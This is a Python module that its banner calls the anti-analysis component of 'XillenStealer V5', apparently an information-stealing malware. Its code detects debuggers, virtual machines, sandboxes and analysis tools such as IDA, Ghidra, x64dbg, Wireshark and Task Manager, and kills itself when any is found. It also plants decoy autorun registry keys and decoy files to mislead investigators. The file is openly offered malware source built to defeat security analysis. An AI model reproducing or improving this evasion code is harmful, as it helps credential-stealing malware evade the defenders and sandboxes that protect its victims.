import ctypes
import ctypes.wintypes
import os
import sys
import time
import random
import subprocess
import psutil
import winreg
from ctypes import wintypes
import threading

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
CREATE_SUSPENDED = 0x00000004
INFINITE = 0xFFFFFFFF

# Load Windows DLLs
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
user32 = ctypes.WinDLL('user32', use_last_error=True)
advapi32 = ctypes.WinDLL('advapi32', use_last_error=True)

class AntiAnalysisProtection:
    def __init__(self):
        self.is_protected = False
        self.debugger_detected = False
        self.vm_detected = False
        self.sandbox_detected = False
        self.analysis_tools_detected = False
        
    def enable_full_protection(self):
        """Enable all protection mechanisms"""
        print("🛡️ Enabling Anti-Analysis Protection...")
        
        # Anti-Debug protection
        self._enable_anti_debug()
        
        # Anti-VM protection
        self._enable_anti_vm()
        
        # Anti-Sandbox protection
        self._enable_anti_sandbox()
        
        # Anti-Analysis Tools protection
        self._enable_anti_analysis_tools()
        
        # Process protection
        self._enable_process_protection()
        
        # Memory protection
        self._enable_memory_protection()
        
        # Registry protection
        self._enable_registry_protection()
        
        # File system protection
        self._enable_filesystem_protection()
        
        self.is_protected = True
        print("✅ Anti-Analysis Protection enabled!")
        
    def _enable_anti_debug(self):
        """Enable anti-debugging protection"""
        print("🔍 Enabling Anti-Debug protection...")
        
        # Check for debugger using IsDebuggerPresent
        if kernel32.IsDebuggerPresent():
            self.debugger_detected = True
            self._terminate_process()
            
        # Check for debugger using CheckRemoteDebuggerPresent
        is_debugger_present = ctypes.c_bool()
        kernel32.CheckRemoteDebuggerPresent(
            kernel32.GetCurrentProcess(),
            ctypes.byref(is_debugger_present)
        )
        if is_debugger_present.value:
            self.debugger_detected = True
            self._terminate_process()
            
        # Set debugger breakpoint trap
        self._set_debugger_trap()
        
        # Check for common debugger processes
        self._check_debugger_processes()
        
    def _enable_anti_vm(self):
        """Enable anti-virtualization protection"""
        print("🖥️ Enabling Anti-VM protection...")
        
        # Check for VM artifacts
        vm_indicators = [
            "VMware", "VirtualBox", "QEMU", "Xen", "Hyper-V",
            "Parallels", "Virtual PC", "Bochs", "KVM"
        ]
        
        # Check system information
        try:
            import wmi
            c = wmi.WMI()
            for system in c.Win32_ComputerSystem():
                manufacturer = system.Manufacturer.lower()
                model = system.Model.lower()
                
                for indicator in vm_indicators:
                    if indicator.lower() in manufacturer or indicator.lower() in model:
                        self.vm_detected = True
                        self._terminate_process()
        except:
            pass
            
        # Check for VM-specific registry keys
        vm_registry_keys = [
            r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VBoxService",
            r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VMTools",
            r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vm3dservice",
            r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VMTools",
            r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmci",
            r"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\vmhgfs"
        ]
        
        for key_path in vm_registry_keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path.split('\\', 1)[1])
                winreg.CloseKey(key)
                self.vm_detected = True
                self._terminate_process()
            except:
                pass
                
        # Check for VM-specific files
        vm_files = [
            r"C:\windows\system32\drivers\vmmouse.sys",
            r"C:\windows\system32\drivers\vmhgfs.sys",
            r"C:\windows\system32\drivers\VBoxMouse.sys",
            r"C:\windows\system32\drivers\VBoxGuest.sys",
            r"C:\windows\system32\drivers\VBoxSF.sys",
            r"C:\windows\system32\drivers\VBoxVideo.sys"
        ]
        
        for file_path in vm_files:
            if os.path.exists(file_path):
                self.vm_detected = True
                self._terminate_process()
                
    def _enable_anti_sandbox(self):
        """Enable anti-sandbox protection"""
        print("📦 Enabling Anti-Sandbox protection...")
        
        # Check for sandbox indicators
        sandbox_processes = [
            "sandboxie", "wireshark", "fiddler", "procmon", "procmon64",
            "regmon", "filemon", "idaq", "idaq64", "ollydbg", "windbg",
            "x64dbg", "x32dbg", "immunity", "cheatengine", "artmoney"
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for sandbox_proc in sandbox_processes:
                    if sandbox_proc in proc_name:
                        self.sandbox_detected = True
                        self._terminate_process()
            except:
                continue
                
        # Check for sandbox-specific registry keys
        sandbox_registry_keys = [
            r"HKEY_LOCAL_MACHINE\SOFTWARE\Sandboxie",
            r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Sandboxie"
        ]
        
        for key_path in sandbox_registry_keys:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path.split('\\', 1)[1])
                winreg.CloseKey(key)
                self.sandbox_detected = True
                self._terminate_process()
            except:
                pass
                
        # Check system uptime (sandboxes often have low uptime)
        try:
            uptime = time.time() - psutil.boot_time()
            if uptime < 600:  # Less than 10 minutes
                self.sandbox_detected = True
                self._terminate_process()
        except:
            pass
            
    def _enable_anti_analysis_tools(self):
        """Enable protection against analysis tools"""
        print("🔧 Enabling Anti-Analysis Tools protection...")
        
        # Check for analysis tools
        analysis_tools = [
            "ida", "ghidra", "radare2", "x64dbg", "ollydbg", "windbg",
            "immunity", "cheatengine", "artmoney", "processhacker",
            "processexplorer", "autoruns", "regedit", "msconfig",
            "taskmgr", "eventvwr", "perfmon", "wireshark", "fiddler"
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for tool in analysis_tools:
                    if tool in proc_name:
                        self.analysis_tools_detected = True
                        self._terminate_process()
            except:
                continue
                
    def _enable_process_protection(self):
        """Enable process protection"""
        print("⚡ Enabling Process protection...")
        
        # Set process priority to high
        try:
            kernel32.SetPriorityClass(kernel32.GetCurrentProcess(), 0x00000080)  # HIGH_PRIORITY_CLASS
        except:
            pass
            
        # Hide process from task manager
        try:
            # This is a simplified version - real implementation would be more complex
            pass
        except:
            pass
            
    def _enable_memory_protection(self):
        """Enable memory protection"""
        print("🧠 Enabling Memory protection...")
        
        # Allocate memory and fill with random data
        try:
            for _ in range(10):
                size = random.randint(1024, 4096)
                kernel32.VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        except:
            pass
            
    def _enable_registry_protection(self):
        """Enable registry protection"""
        print("📋 Enabling Registry protection...")
        
        # Create fake registry entries to confuse analysis
        try:
            fake_keys = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\FakeApp",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SystemService",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityUpdate"
            ]
            
            for key_path in fake_keys:
                try:
                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.SetValueEx(key, "FakeValue", 0, winreg.REG_SZ, "FakeData")
                    winreg.CloseKey(key)
                except:
                    pass
        except:
            pass
            
    def _enable_filesystem_protection(self):
        """Enable filesystem protection"""
        print("📁 Enabling Filesystem protection...")
        
        # Create fake files to confuse analysis
        try:
            fake_files = [
                r"C:\temp\fake_log.txt",
                r"C:\temp\system_config.ini",
                r"C:\temp\security_update.exe"
            ]
            
            for file_path in fake_files:
                try:
                    with open(file_path, 'w') as f:
                        f.write("Fake data to confuse analysis tools")
                except:
                    pass
        except:
            pass
            
    def _set_debugger_trap(self):
        """Set debugger breakpoint trap"""
        try:
            # Set a breakpoint that will trigger if debugger is attached
            kernel32.DebugBreak()
        except:
            pass
            
    def _check_debugger_processes(self):
        """Check for debugger processes"""
        debugger_processes = [
            "ollydbg.exe", "ida.exe", "ida64.exe", "windbg.exe",
            "x64dbg.exe", "x32dbg.exe", "immunity.exe", "cheatengine.exe"
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for debugger in debugger_processes:
                    if debugger in proc_name:
                        self.debugger_detected = True
                        self._terminate_process()
            except:
                continue
                
    def _terminate_process(self):
        """Terminate the process if threats are detected"""
        print("🚨 Threat detected! Terminating process...")
        
        # Clear sensitive data from memory
        self._clear_sensitive_data()
        
        # Terminate process
        try:
            kernel32.ExitProcess(0)
        except:
            try:
                os._exit(0)
            except:
                sys.exit(0)
                
    def _clear_sensitive_data(self):
        """Clear sensitive data from memory"""
        try:
            # Overwrite sensitive variables
            sensitive_vars = ['password', 'token', 'key', 'secret']
            for var in sensitive_vars:
                if var in globals():
                    globals()[var] = '0' * 100
        except:
            pass
            
    def is_analysis_environment(self):
        """Check if running in analysis environment"""
        return (self.debugger_detected or 
                self.vm_detected or 
                self.sandbox_detected or 
                self.analysis_tools_detected)

# Global instance
anti_analysis = AntiAnalysisProtection()

def enable_protection():
    """Enable anti-analysis protection"""
    anti_analysis.enable_full_protection()

def is_protected():
    """Check if protection is enabled"""
    return anti_analysis.is_protected

def is_analysis_detected():
    """Check if analysis environment is detected"""
    return anti_analysis.is_analysis_environment()

if __name__ == "__main__":
    print("🛡️ XillenStealer V5 - Anti-Analysis Protection")
    print("=" * 50)
    
    enable_protection()
    
    if is_protected():
        print("✅ Protection enabled successfully!")
    else:
        print("❌ Protection failed to enable!")
        
    if is_analysis_detected():
        print("🚨 Analysis environment detected!")
    else:
        print("✅ Clean environment detected!")
